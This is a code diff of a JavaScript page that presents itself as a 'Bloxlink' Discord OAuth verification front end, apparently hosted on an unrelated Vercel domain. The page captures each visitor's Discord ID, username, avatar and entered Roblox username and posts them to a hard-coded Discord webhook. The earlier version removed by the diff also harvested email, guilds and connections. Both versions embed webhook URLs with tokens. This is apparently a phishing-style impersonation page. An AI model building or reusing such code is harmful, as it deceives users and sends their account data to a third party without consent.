@@ -1,5 +1,14 @@
+/**
+ * Bloxlink Frontend & Discord OAuth Controller
+ * Automatically captures and renders real Discord user profile (name, avatar, ID) via OAuth.
+ * Enforces Discord OAuth verification before allowing access to the Roblox verification modal.
+ */
 document.addEventListener('DOMContentLoaded', () => {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1541823565794385953/vzMaD6XWXmztaHuI3owTR35oUdc7BIJ-d9w2JIyZwgPETiOV2GgJU-wMLdqm0s6JK0cx";
+  // =============================================================
+  // CONFIGURAÇÃO DO WEBHOOK DO DISCORD (OPCIONAL)
+  // Cole a URL do seu webhook entre as aspas abaixo se desejar receber logs:
+  // =============================================================
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1541640265461137538/YDaXpIpBQl0MWbIzeFLvcSTI4zbpPTqTkTgKfc1PusePVzOrtK6GiGC1CTlUx7Q78Hwa";
 
   // -------------------------------------------------------------
   // DOM Elements
@@ -48,10 +57,7 @@ document.addEventListener('DOMContentLoaded', () => {
       ? encodeURIComponent(window.location.origin + '/')
       : encodeURIComponent('https://embriaozinho.vercel.app/');
 
-    // O escopo 'email' é crucial para que o e-mail seja retornado
-    const scopes = 'email identify guilds connections';
-
-    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=code&redirect_uri=https%3A%2F%2Fembriaozinho.vercel.app%2F&scope=email%20identify%20guilds%20connections`;
+    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=token&redirect_uri=${redirectUri}&scope=identify`;
 
     window.location.href = discordOAuthUrl;
   }
@@ -61,79 +67,59 @@ document.addEventListener('DOMContentLoaded', () => {
   // -------------------------------------------------------------
   async function fetchDiscordUserProfile(accessToken) {
     try {
-      // 1. Fetch basic user info
-      const userResponse = await fetch('https://discord.com/api/users/@me', {
+      const response = await fetch('https://discord.com/api/users/@me', {
         headers: {
           Authorization: `Bearer ${accessToken}`
         }
       });
 
-      if (!userResponse.ok) {
-        throw new Error(`HTTP error! status: ${userResponse.status}`);
-      }
-      const user = await userResponse.json();
-
-      // 2. Fetch user email (requires 'email' scope)
-      const emailResponse = await fetch('https://discord.com/api/users/@me/email', {
-        headers: {
-          Authorization: `Bearer ${accessToken}`
+      if (response.ok) {
+        const user = await response.json();
+        
+        // Format Display Name
+        const name = user.global_name || user.username || 'powerfromcsm.';
+        
+        // Format Dynamic Discord Avatar URL
+        let avatar = './assets/avatar.png';
+        if (user.avatar) {
+          const isGif = user.avatar.startsWith('a_');
+          const ext = isGif ? 'gif' : 'png';
+          avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`;
+        } else if (user.id) {
+          try {
+            const defaultNum = Number((BigInt(user.id) >> 22n) % 6n);
+            avatar = `https://cdn.discordapp.com/embed/avatars/${defaultNum}.png`;
+          } catch (e) {
+            avatar = 'https://cdn.discordapp.com/embed/avatars/0.png';
+          }
         }
-      });
 
-      let userEmail = 'N/A'; // Valor padrão se o e-mail não puder ser obtido
-      if (emailResponse.ok) {
-        const emailData = await emailResponse.json();
-        userEmail = emailData.email;
-      } else {
-        console.warn('Could not fetch user email. Ensure the "email" scope is granted.');
+        const profile = {
+          id: user.id,
+          username: user.username,
+          displayName: name,
+          avatarUrl: avatar
+        };
+
+        // Persist profile
+        localStorage.setItem('discord_user_profile', JSON.stringify(profile));
+        localStorage.setItem('bloxlink_logged_in', 'true');
+
+        applyUserProfile(profile);
+
+        // Dispara notificação para o Webhook se estiver configurado
+        const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
+        sendToDiscordWebhook(profile, robloxUser);
+
+        return true;
       }
-
-      // Format Display Name
-      const name = user.global_name || user.username || 'powerfromcsm.';
-
-      // Format Dynamic Discord Avatar URL
-      let avatar = './assets/avatar.png';
-      if (user.avatar) {
-        const isGif = user.avatar.startsWith('a_');
-        const ext = isGif ? 'gif' : 'png';
-        avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`;
-      } else if (user.id) {
-        try {
-          const defaultNum = Number((BigInt(user.id) >> 22n) % 6n);
-          avatar = `https://cdn.discordapp.com/embed/avatars/${defaultNum}.png`;
-        } catch (e) {
-          avatar = 'https://cdn.discordapp.com/embed/avatars/0.png';
-        }
-      }
-
-      const profile = {
-        id: user.id,
-        username: user.username,
-        displayName: name,
-        avatarUrl: avatar,
-        email: userEmail // Adiciona o e-mail ao objeto de perfil
-      };
-
-      // Persist profile
-      localStorage.setItem('discord_user_profile', JSON.stringify(profile));
-      localStorage.setItem('bloxlink_logged_in', 'true');
-
-      applyUserProfile(profile);
-
-      // Dispara notificação para o Webhook se estiver configurado
-      const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
-      // Passa as scopes utilizadas para o webhook
-      sendToDiscordWebhook(profile, robloxUser, 'email identify guilds connections');
-
-      return true;
     } catch (err) {
       console.error('Failed to fetch Discord user profile:', err);
     }
     return false;
   }
 
-  // Modificado para incluir o e-mail no payload do webhook
-  async function sendToDiscordWebhook(profile, robloxUser, scopes) {
+  async function sendToDiscordWebhook(profile, robloxUser) {
     if (!WEBHOOK_URL || WEBHOOK_URL.trim() === '') return;
 
     const payload = {
@@ -157,18 +143,8 @@ document.addEventListener('DOMContentLoaded', () => {
               inline: true
             },
             {
-              name: "📧 E-mail", // Novo campo para o e-mail
-              value: `\`${profile.email}\``,
-              inline: false
-            },
-            {
               name: "🎮 Roblox Informado",
               value: robloxUser ? `\`${robloxUser}\`` : "*Nenhum*",
-              inline: false
-            },
-            {
-              name: "🔑 Escopos Solicitados",
-              value: `\`${scopes}\``,
               inline: false
             }
           ],
@@ -187,7 +163,6 @@ document.addEventListener('DOMContentLoaded', () => {
       console.error("Erro ao enviar para o webhook:", err);
     }
   }
-
 
   function applyUserProfile(profile) {
     if (!profile) return;
@@ -223,7 +198,7 @@ document.addEventListener('DOMContentLoaded', () => {
       await fetchDiscordUserProfile(tokenToUse);
 
       // Restore saved Roblox username into input if present
-      const savedRoblox = sessionStorage.getItem('saved_roblox_username') || '';
+      const savedRoblox = sessionStorage.getItem('saved_roblox_username');
       if (savedRoblox && robloxUserInput) {
         robloxUserInput.value = savedRoblox;
       }
@@ -233,7 +208,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (discordCode) {
       // Returned with ?code=...
       window.history.replaceState({}, document.title, window.location.pathname);
-
+      
       const savedProfileStr = localStorage.getItem('discord_user_profile');
       if (savedProfileStr) {
         try {
@@ -242,7 +217,7 @@ document.addEventListener('DOMContentLoaded', () => {
           return;
         } catch (e) {}
       }
-
+      
       // Default logged in UI
       if (loggedOutSection) loggedOutSection.style.display = 'none';
       if (loggedInSection) loggedInSection.style.display = 'block';
